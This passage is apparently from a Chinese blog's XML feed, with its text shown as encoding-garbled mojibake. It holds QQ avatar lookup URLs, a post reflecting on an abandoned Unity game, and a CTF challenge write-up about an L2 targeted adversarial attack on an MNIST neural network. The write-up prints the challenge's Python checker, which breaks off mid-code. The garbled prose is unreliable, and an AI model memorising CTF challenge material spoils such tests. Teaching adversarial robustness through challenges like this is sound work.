class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;ava&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://q.qlogo.cn/g?b=qq&amp;k=UDUVtLNg8WvYmkaibG4wtIg&amp;s=640&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://d33b4t0.com/&quot;</span>&gt;</span>Deebato<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>XDSEC2020[Crypto]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>    </div></div><p>è·å–Keyï¼š<a href="https://ptlogin2.qq.com/getface?&amp;imgtype=1&amp;uin=123456">https://ptlogin2.qq.com/getface?&amp;imgtype=1&amp;uin=123456</a></p><p>é€šè¿‡Keyè·å–å¤´åƒï¼š<a href="https://q.qlogo.cn/g?b=qq&amp;k=xyOnRe5ML3Aw96iaaQ1hh6w&amp;s=640">https://q.qlogo.cn/g?b=qq&amp;k=xyOnRe5ML3Aw96iaaQ1hh6w&amp;s=640</a></p><p>é€šè¿‡QQå·è·å–å¤´åƒï¼š<a href="https://q.qlogo.cn/g?b=qq&amp;nk=123456&amp;s=640">https://q.qlogo.cn/g?b=qq&amp;nk=123456&amp;s=640</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§</title>
      <link href="2022/05/27/%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E5%89%8D%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/"/>
      <url>2022/05/27/%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E5%89%8D%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æƒ³åœ¨ä¹‹å‰Uncertaintyçš„åŸºç¡€ä¸Šæ‹“å±•å‡ºä¸€ä¸ªç±»ä¼¼Ghost Runnerçš„è·‘é…·å°„å‡»æ¸¸æˆï¼Œå¾ˆæ˜¾ç„¶å¼€å§‹å†™è¿™ä¸ªæ–‡é‚£è‚¯å®šæ˜¯å·²ç»Failedå˜ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½è¯´åƒä¸€å ‘é•¿ä¸€æ™ºå§ï¼Œå¸Œæœ›æˆ‘å·²ç»ä»æ„šæ˜§å±±å³°æ‰åˆ°äº†emoä¹‹è°·ï¼ˆå¿˜äº†é‚£ä¸ªç©æ„å„¿å«å•¥äº†ï¼‰</p><p>ä»¥ä¸‹ç®€å•è¯´æ˜ä¸€ä¸‹ä¸ºä»€ä¹ˆæœ€åä»£ç å’Œå·¥ç¨‹åšä¸ä¸‹å»å˜ï¼Œå°±æ˜¯ä¸ªè‡ªæˆ‘åçœï¼Œå¯èƒ½æ²¡å•¥å¹²è´§</p><span id="more"></span><!--toc--><h1 id="æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§"><a href="#æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§" class="headerlink" title="æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§"></a>æ¸¸æˆåˆ¶ä½œå‰å‡†å¤‡å·¥ä½œçš„é‡è¦æ€§</h1><h2 id="GDD"><a href="#GDD" class="headerlink" title="GDD"></a>GDD</h2><p>è¯´å®è¯è¿™æ¬¡ç»§ç»­æ‹“å±•è¿™ä¸ªæ¸¸æˆå°±åªçŸ¥é“æˆ‘ä»¬è¦åšçš„æ˜¯ä¸ªè·‘é…·æ‰“æªçš„æ¸¸æˆï¼Œè€Œå¯¹äºå…³å¡è®¾è®¡ï¼Œæ˜¯å¦å…·æœ‰å¯ç©æ€§ï¼ŒèƒŒåçš„å¾ˆå¤šè®¾å®šï¼Œç¾æœ¯é£æ ¼ï¼Œéƒ½æ˜¯ä¸€è¾¹åšä¸€è¾¹å†³å®šçš„</p><p>æˆ‘åªèƒ½è¯´è¾¹åšè¾¹å®šè¿™ç§è¡Œä¸ºå¯¹äºå°å›¢é˜Ÿå°é¡¹ç›®æ¥è¯´æ˜¯å®Œå…¨é€‚ç”¨çš„ï¼Œå°¤å…¶æ˜¯å¯¹äºä¸€ä¸ªåƒæˆ‘ä¸€æ ·çš„Noobï¼Œå› ä¸ºè®©ä¸€ä¸ªæ²¡æ€ä¹ˆç³»ç»Ÿæ€§åšè¿‡æ¸¸æˆçš„å‡†Beginneræ¥ç€æ‰‹GDDï¼Œå¯èƒ½ä¼šå¯¼è‡´è®¡åˆ’çš„å†…å®¹è¿‡äºæŠ½è±¡å’Œè„±ç¦»å®é™…ï¼Œå”¯ä¸€èƒ½å¤Ÿè´¡çŒ®çš„ä¹Ÿå°±ä¸€ä¸ªæŒ‡å¯¼æ„ä¹‰äº†ï¼Œä½†ç›´æ¥å¼€å§‹åšï¼Œè¾¹åšè¾¹è§£å†³é—®é¢˜ï¼Œè™½ç„¶ç¬¬ä¸€æ¬¡åšå‡ºæ¥çš„ä¸œè¥¿ä¼šåˆ°å¤„éƒ½æ˜¯ä¸åˆç†çš„åœ°æ–¹ï¼Œä½†æœ€é‡è¦çš„æ˜¯è®©å®è·µè€…çŸ¥é“äº†åœ¨å®æ“ä¸­å¯èƒ½é‡åˆ°çš„å›°éš¾å’Œå·²ç»æ‹¥æœ‰çš„æŠ€æœ¯èƒ½åŠ›ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡åšæ¸¸æˆçš„æ—¶å€™å°±å¯ä»¥å°è¯•å¼€å§‹GDDäº†ï¼Œç„¶åæ¯æ¬¡æŠŠæ¸¸æˆåšå¤§ä¸€ç‚¹ç‚¹ï¼Œæ¯æ¬¡åšä¹‹å‰æŠŠä¸åˆç†çš„åœ°æ–¹è¿›è¡Œé‡æ„é‡å†™ï¼Œå°±å¯ä»¥åšå‡ºæ›´åŠ åˆç†çš„ä¸œè¥¿äº†ï¼ˆè€Œä¸æ˜¯åƒæ˜¯åœ¨å †ä¸€åº§å±å±±</p><p>æ€»ç»“å°±æ˜¯ï¼šåšç¬¬ä¸€ä¸ªæ¸¸æˆæœ€å¥½åˆ«å¼„ä»€ä¹ˆGDDï¼Œæ”¾æ‰‹å»åšå°±è¡Œï¼Œç„¶åä¹Ÿåˆ«å¤ªæœ‰é‡å¿ƒï¼Œå°±å°½é‡åšç›´åˆ°è‡ªå·±è§‰å¾—è¿™å±å±±ä»£ç ä¸é‡æ„ä¸€ä¸‹çœŸçš„å†™ä¸ä¸‹å»çš„æ—¶å€™ï¼Œå°±å¼€ç¬¬äºŒä¸ªæ¸¸æˆçš„å‘ã€‚åœ¨ç¬¬äºŒä¸ªæ¸¸æˆä¸­ä»»ä½•ä¸€è¡Œä»£ç ä¹‹å‰å…ˆæ•²å®šGDDï¼Œå¹¶å¤§æ¦‚è§„åˆ’ä¸€ä¸‹å„ä¸ªåˆ¶ä½œç¯èŠ‚ã€åˆ¶ä½œé˜¶æ®µçš„å‘¨æœŸï¼Œè®¡åˆ’å¥½äº†å†åšäº‹ï¼Œä¸ç„¶å¾ˆå®¹æ˜“Spaghetti Code</p><p>ï¼ˆæ‰€ä»¥è¿™ä¹ˆæ¥è¯´ï¼Œè™½ç„¶è¯´Uncertaintyæ˜¯åšçš„ç¬¬ä¸€ä¸ªæ¸¸æˆï¼Œä½†æ˜¯è¯´å®è¯å¹¶æ²¡æœ‰è§‰å¾—â€åšä¸ä¸‹å»äº†â€œï¼Œè€Œåœ¨è¿™ä¸ªæ–°çš„æ‹“å±•ä¸­å´æœ‰è¿™ç§æ„Ÿè§‰ï¼Œè¯´æ˜ç“¶é¢ˆæ˜¯ç°åœ¨æ‰æœ‰çš„ï¼Œé‚£å°±åœ¨ä¸‹ä¸€ä¸ªæ¸¸æˆå¼€å§‹æ³¨æ„è¿™äº›äº†å—¯</p><h2 id="æ¶æ„"><a href="#æ¶æ„" class="headerlink" title="æ¶æ„"></a>æ¶æ„</h2><p>åœ¨æ­£å¼åŠ¨å·¥ä¹‹å‰ï¼Œè¦ç°æ ¹æ®GDDå¯¹æ•´ä½“æ¶æ„è¿›è¡Œå¤§æ¦‚çš„é¢…å†…codingï¼Œæ¯”å¦‚ç±»ä¸ç±»çš„ç»§æ‰¿å…³ç³»ï¼Œä¸€ä¸ªç»§æ‰¿<code>Monobehaviour</code>çš„ç±»ä¸­çš„å“ªäº›å†…å®¹å¯ä»¥è¢«æŠ½è±¡å‡ºæ¥ä½œä¸ºä¸€ä¸ªæ›´ä¸ºGenericçš„ç±»ï¼Œè¦å‡†å¤‡å“ªäº›æ¥å£ï¼Œè¦å¦‚ä½•æ„å»ºEvent Systemç­‰ç­‰ã€‚è¯´å®è¯æˆ‘ç°åœ¨å†™è¿™ä¸ªçš„æ—¶å€™æˆ‘éƒ½è¿˜æ²¡æœ‰å¤ªç†è§£åˆ°åº•æ€æ ·æ‰èƒ½åšåˆ°ä¸€ä¸ªä¼˜ç§€çš„æ¶æ„ï¼Œç­‰æˆ‘ä»¥åçœŸçš„ä¼šåšè¿™äº›å·¥ä½œäº†æˆ‘å†å‘ä¸€ç¯‡æ–‡ç†ä¸€ä¸‹ï¼Œä½†è‡³å°‘å¤šèŠ±ç‚¹æ—¶é—´åœ¨ç€æ‰‹codingå‰çš„è®¾è®¡ä¸Šï¼Œèƒ½è®©ä½ åœ¨å®é™…codingä¸­å°‘å¾ˆå¤šé¡¾è™‘ï¼Œå¹¶ä¸”å¯¹è‡ªå·±çš„codeæ›´æœ‰åº•æ°”ï¼ˆæˆ‘è¿™æ¬¡å°±å†™äº†å¾ˆå¤šæ²¡åº•æ°”çš„codeï¼Œæ¯”å¦‚æˆ‘æœ‰äº›æ—¶å€™è§‰å¾—â€œå¥½åƒè¿™äº›codeä¸è¯¥å†™è¿›è¿™ä¸ªç±»å•Šâ€¦â€ï¼Œä½†æ˜¯å› ä¸ºå›¾æ–¹ä¾¿ä»¥åŠç¡®å®ä¸å¤ªæ¸…æ¥šè¦æ€ä¹ˆåšæ‰æ˜¯æ­£ç¡®çš„ï¼Œå¯¼è‡´ä»£ç è¶Šå†™è¶Šä¹±ï¼Œè¶Šå†™è¶Šéš¾å—ï¼Œç›´åˆ°å®Œå…¨å¼€æ‘†ï¼Œç±»ä¸ç±»ä¹‹é—´çš„å…³ç³»ä¹±åˆ°å‘æŒ‡</p><p>å› ä¸ºæ˜¯åœ¨Unityå¼•æ“åŸºç¡€ä¸Šåšæ¸¸æˆï¼Œåªéœ€è¦è€ƒè™‘æ¸¸æˆæœ¬èº«çš„æ¶æ„ï¼Œæ‰€ä»¥å…¶å®å·²ç»å¾ˆè¡¨å±‚äº†ï¼Œä¹‹å‰çš„Uncertaintyå› ä¸ºç»“æ„ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå¤æ‚çš„è¦ç´ ï¼Œæ‰€ä»¥åšèµ·æ¥å…¶å®æ ¹æœ¬ä¸éœ€è¦ä»€ä¹ˆæ¶æ„ï¼Œä¸€ç›´å †ä»£ç å°±å®Œäº‹äº†ï¼Œä»£ç å±‚é¢ä¸Šéƒ½æ²¡æ€ä¹ˆç”¨æ¥å£ç»§æ‰¿è™šå‡½æ•°ä¹‹ç±»çš„ä¸œè¥¿ï¼Œç»“æ„éå¸¸â€å¹³é¢â€œï¼Œé€»è¾‘ä¸Šåªæœ‰å‡ ä¸ªæŒ‰é’®å‡ ä¸ªé—¨æ¥åšä¸€äº›ç®€å•çš„äº¤äº’ï¼ŒEventçš„ç®¡ç†ä¸Šä¹Ÿéå¸¸å¹³é¢ï¼Œè¿‡äºç®€å•</p><p>ä½†æ˜¯å½“æˆ‘ä»¬æƒ³è¦å¢åŠ ä¸€ç‚¹NPCï¼Œä¸€äº›æ•Œäººçš„æ—¶å€™ï¼Œå°±å‘ç°éœ€è¦åšçš„å·¥ä½œè¿˜å·®çš„å¾ˆå¤šäº†ï¼Œé¦–å…ˆåœ¨ä¸€å¼€å§‹å› ä¸ºPlayerä¸éœ€è¦ç”Ÿå‘½å€¼ï¼Œæ‰€ä»¥åæ¥åŠ äº†ä¸€ä¸ªEntityç±»æ¥Deriveå‡ºå…·æœ‰ç”Ÿå‘½å€¼çš„ç‰©ä½“ï¼Œ</p><h2 id="OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€"><a href="#OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€" class="headerlink" title="OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€"></a>OOPåŸºç¡€å’Œè¯­è¨€åŸºç¡€</h2><p>ä¸å¾—ä¸è¯´OOPå¯¹æˆ‘è¿˜è¯´è¿˜ä»ç„¶æ˜¯ä¸€ä¸ªç¥å¥‡çš„ä¸œè¥¿ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯â€œæˆ‘è„‘å­éƒ½æ˜ç™½è¿™äº›å…³é”®å­—ã€è¿™äº›æ“ä½œæ˜¯ä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä¹ŸçŸ¥é“ä»–ä»¬ä¹‹é—´çš„é€»è¾‘å…³ç³»â€ï¼Œä½†æˆ‘æœ‰äº›æ—¶å€™å°±æ˜¯ä¸èƒ½<strong>åˆç†</strong>åœ°å¤„ç†ä»–ä»¬åœ¨å®é™…è¿ç”¨åœºæ™¯ä¸­çš„å…³ç³»</p><p>è¯­è¨€åŸºç¡€åº”è¯¥ä¹Ÿæ˜¯å¯¼è‡´OOPä¸ç†Ÿçš„ä¸€ä¸ªåŸå› ï¼Œæˆ‘ä¸€å¼€å§‹å¯¹äºæ¥å£ã€è™šå‡½æ•°ã€é‡å†™ã€eventä¹‹ç±»çš„å…³é”®çš„è¦ç´ äº†è§£å’Œåº”ç”¨å¤ªå°‘ï¼Œå¯¼è‡´åŸºç¡€ä¸ç‰¢å›ºï¼Œè‡³äºè¦ç†Ÿæ‚‰è¿™äº›å†…å®¹ï¼Œé‚£æœ€å¥½å¤šåšä¸€äº›å·¥å…·åŒ–çš„å®ç°ï¼Œæ¯”å¦‚èƒŒåŒ…ç³»ç»Ÿå•Šï¼Œæˆ–è€…å®è·µä¸€äº›NPCçš„AIç³»ç»Ÿå•Šä»€ä¹ˆçš„ï¼Œä½†å…³é”®éƒ½æ˜¯åšå®Œä¹‹åè¦å°½å¯èƒ½è§£è€¦ï¼Œå¹¶å°½åŠ›ä¿è¯æŠ½è±¡å‡ºæ¥çš„ç³»ç»Ÿçš„é€šç”¨æ€§</p><h2 id="ä¹‹åçš„è§„åˆ’"><a href="#ä¹‹åçš„è§„åˆ’" class="headerlink" title="ä¹‹åçš„è§„åˆ’"></a>ä¹‹åçš„è§„åˆ’</h2><p>èŠ±äº†ä¸€ä¸ªå¤šæœˆå»è¯•ç€åœ¨ä¹‹å‰åšè¿‡çš„æ¸¸æˆçš„åŸºç¡€ä¸Šç»§ç»­åšä¸ªæ¸¸æˆä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯è‡ªå·±çš„é—®é¢˜ï¼Œè‡³å°‘ç°åœ¨å¯¹å¾ˆå¤šä¸œè¥¿çš„åº”ç”¨åœºæ™¯æœ‰æ›´æ·±çš„ç†è§£äº†ï¼Œä¹Ÿè¿˜æ˜¯æ–°å­¦äº†ä¸å°‘å†…å®¹çš„implement</p><p>ç°åœ¨è¿™ä¸ªæ—¶é—´ç‚¹å±äºæ˜¯é©¬ä¸Šå°±è¦æœŸæœ«äº†ï¼Œæ‰€ä»¥å¾—æ»šå»å¤ä¹ å’Œèµ¶ä½œä¸šçš„DDLäº†</p><p>å‡æœŸå°½é‡åšäº›æ¸¸æˆå¼•æ“åº•å±‚çš„ä¸œè¥¿æ“ä¸ªMCï¼ˆè²Œä¼¼æ¥è§¦åº•å±‚å…ˆæ“MCæ˜¯ä¸ªæ¯”è¾ƒæ™®éçš„HelloWorldï¼‰ï¼Œå¸Œæœ›èƒ½ç”¨ä¸Šè¿™å­¦æœŸï¼ˆè™½ç„¶æœ‰è¯¾ä½†çº¯é è‡ªï¼‰å­¦çš„OS</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>L2 Targeted Attack</title>
      <link href="2022/04/09/L2-TargetedAttack/"/>
      <url>2022/04/09/L2-TargetedAttack/</url>
      
        <content type="html"><![CDATA[<p>ç»ˆäºæ˜¯æŠŠè¿™ç©æ„å„¿è‡ªå·±å®ç°äº†ä¸€éï¼Œæ°é€¢miniL CTFï¼Œè¿™æ–‡ç« è™½ç„¶æ˜¯22.04.09å†™çš„ï¼Œä½†æ˜¯ä¼°è®¡åšå®¢å¾—ç­‰åˆ°äº”æœˆå¤šæ‰ä¼šæ›´æ–°ï¼Œå±Šæ—¶å°†ä¹Ÿå†è¡¥å……ä¸€äº›åœ¨miniL CTFä¸­æœ¬é¢˜çš„æƒ…å†µ</p><span id="more"></span><h1 id="L2-Targeted-Attack"><a href="#L2-Targeted-Attack" class="headerlink" title="L2 Targeted Attack"></a>L2 Targeted Attack</h1><p><strong>å‰ç½®çŸ¥è¯†ï¼š<a href="https://kyriota.com/2022/01/16/%E5%85%A8%E8%BF%9E%E6%8E%A5%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C[%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8]/">å…¨è¿æ¥ç¥ç»ç½‘ç»œ</a></strong></p><p><strong>å‚è€ƒæ–‡çŒ®ï¼š<a href="https://arxiv.org/abs/1608.04644">Towards Evaluating the Robustness</a></strong></p><blockquote><p>ç¢ç¢å¿µï¼šè¿™æ®µæ—¶é—´åˆåœ¨æ£é¼“<a href="https://kyriota.com/2021/11/17/Uncertainty/">Uncertainty</a>ï¼ŒåŠ ç‚¹å†…å®¹æƒ³å»å‚åŠ å‰æ¯”ç‰¹çš„Jamï¼Œç­‰Jamå®Œäº†å¯èƒ½çš„ç ”ç©¶å¯¹è±¡åº”è¯¥æ˜¯CNNï¼ŒUE5ä¹‹ç±»çš„ï¼ˆç¥ç»ç»†èƒè‡ªåŠ¨æœºæš‚æ—¶å°±å…ˆé¸½äº†ï¼Œä½†ç¡®å®å¾ˆæœ‰è¶£ï¼Œä»¥ååº”è¯¥å›å»çœ‹çœ‹çš„</p></blockquote><h2 id="miniL-CTF"><a href="#miniL-CTF" class="headerlink" title="miniL CTF"></a>miniL CTF</h2><p>æœ‰å¹¸åœ¨æ ¡å†…çš„miniL CTFå‡ºä¸€æ¬¡é¢˜ï¼ˆä¸€ä¸ªL2TargetedAttackï¼Œä¸€ä¸ªCheatEngineæ”¹åæ ‡ï¼‰ï¼Œæœ¬æ¥æƒ³åšä¸€ä¸ªCNNçš„L2 Targeted Attackï¼Œè¿™æ ·å¯ä»¥æŠŠæƒ…æ™¯åŒ…è£…å¾—æœ‰è¶£ä¸€äº›ï¼Œä½†æ˜¯è¿˜æ˜¯å¤ªæ‡’äº†ï¼Œå¼„å®Œè¿™ä¸ªå°±ä¸æƒ³å¼„CNNäº†ï¼Œå°±å…ˆå‡ºåˆ°è¿™é‡Œäº†</p><p>é¢˜ç›®åä¸º<code>NEXT</code>ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è®©ä½ å¯¹MNISTä¸­çš„å‡ ä¸ªSamplesåŠ æ‰°åŠ¨ï¼Œä½¿å¾—å¦‚ä¸‹çš„8ä¸ªSamplesè¢«æ¨¡å‹è¯†åˆ«æˆå…¶åŸæœ¬lableçš„ä¸‹ä¸€ä¸ªæ•°ï¼Œå¦‚1â†’2ï¼Œ2â†’3â€¦</p><p>ä¸ºäº†è®©é¢˜ç›®æœ‰ä¸ªæƒ…æ™¯ï¼Œæ‰€ä»¥æŠŠåŸæœ¬çš„weightç»™è½®äº†ä¸€ä¸‹é¡ºåºï¼ŒåŸlableæœ¬åº”æ˜¯[0,1,2,3,4,5,6,7,8,9]ï¼Œè¢«æ”¹æˆäº†[1,2,3,4,5,6,7,8,9,0]ï¼Œäºæ˜¯ä¹é¢˜ç›®å°±æœ‰äº†ä¸€ä¸ªè™½ç„¶ä¸åˆç†ä½†å¯ä»¥å¿½æ‚ äººçš„æƒ…æ™¯</p><img src="/images/L2TarAtt_Original.png"><p>æ¨¡å‹ä¸ºå¸¦DropOutçš„FCNNï¼Œè™½ç„¶å¸¦DropOutï¼Œä½†æ˜¯æ•´ä½“æ¢¯åº¦æ¯”è¾ƒæ˜æ˜¾ï¼Œå¯¹æ‰°åŠ¨çš„é²æ£’æ€§æ¬ ä½³ï¼Œå¾ˆé€‚åˆä½œä¸ºæ”»å‡»å¯¹è±¡</p><p>æºç ä¸Šå¯¹åŸæœ¬çš„å‡½æ•°åšäº†ä¸€ç‚¹æ··æ·†ï¼Œæ¯”å¦‚<code>softMax</code>ç¼©å†™æˆ<code>SM</code>ä¹‹ç±»çš„ï¼Œä¸»è¦æ˜¯ä¸ºäº†é€‰æ‰‹æ·±å…¥äº†è§£ç¥ç»ç½‘ç»œä¹‹åå†å…¥æ‰‹é¢˜ç›®ï¼Œä¸è¦åº•å±‚æ²¡æ‘¸æ¸…æ¥šåšçº¯çº¯çš„TFboy</p><p>é™åˆ¶äº†L2å’ŒLinfçš„å¤§å°ï¼Œæ˜¯ä¸ºäº†è®©åšé¢˜äººæ˜ç¡®è¿™æ˜¯ä¸€ä¸ªL2 Attack</p><p>taskä¸­ä¸åŒ…å«<code>torch</code>ï¼Œ<code>TF</code>ä¹‹ç±»çš„ï¼Œä½†å¯ä»¥æŠŠweightæ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹ï¼Œç„¶åä½¿ç”¨å¦‚<code>tf.gradientTape</code>ä¹‹ç±»çš„æ–¹æ³•è‡ªåŠ¨æ±‚æ¢¯åº¦ï¼Œæˆ‘è‡ªå·±è§£æ˜¯ç”¨æ¯”è¾ƒåœŸçš„æ‰‹æ“<code>BackProp</code></p><p><a href="https://kyriota.com/html/DLfiles/NEXT_ALL.zip">ä¸‹è½½é¢˜ç›®åŠexp</a></p><p>ä»¥ä¸‹æ˜¯é¢˜ç›®ä»£ç </p><div class='spoiler collapsed'>    <div class='spoiler-title'>        task.py    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">L2CONSTRAIN = <span class="number">5.6789</span></span><br><span class="line">LINFCONSTRAIN = <span class="number">1.234</span></span><br><span class="line">CONFIDENCE = <span class="number">0.8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RL</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.maximum(x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SM</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.array(np.exp(x) / np.<span class="built_in">sum</span>(np.exp(x), axis=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AB</span>(<span class="params">x</span>):</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ANN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, uNum</span>):</span></span><br><span class="line">        self.uNum = uNum</span><br><span class="line">        self.lNum = <span class="built_in">len</span>(uNum)</span><br><span class="line">        self.w = [<span class="number">0</span>]</span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FP</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.lNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[i])</span><br><span class="line">            self.A.append(RL(self.Z[-<span class="number">1</span>]))</span><br><span class="line">        self.Z.append(AB(self.A[-<span class="number">1</span>]) * self.w[-<span class="number">1</span>])</span><br><span class="line">        self.A.append(SM(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRED</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        self.Z[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.A[<span class="number">0</span>] = np.matrix(x)</span><br><span class="line">        self.FP()</span><br><span class="line">        <span class="keyword">return</span> np.array(self.A[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LOAD</span>(<span class="params">self, fileName</span>):</span></span><br><span class="line">        f = <span class="built_in">open</span>(fileName, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        wt = np.frombuffer(f.read(), np.float64)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.uNum)):</span><br><span class="line">            data = wt[: (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]]</span><br><span class="line">            shape = (self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>, self.uNum[i])</span><br><span class="line">            self.w.append(np.matrix(data).reshape(shape))</span><br><span class="line">            wt = wt[(self.uNum[i - <span class="number">1</span>] + <span class="number">1</span>) * self.uNum[i]:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHECK</span>(<span class="params">mask: np.matrix, myNN: ANN, x</span>):</span></span><br><span class="line">    l2 = np.<span 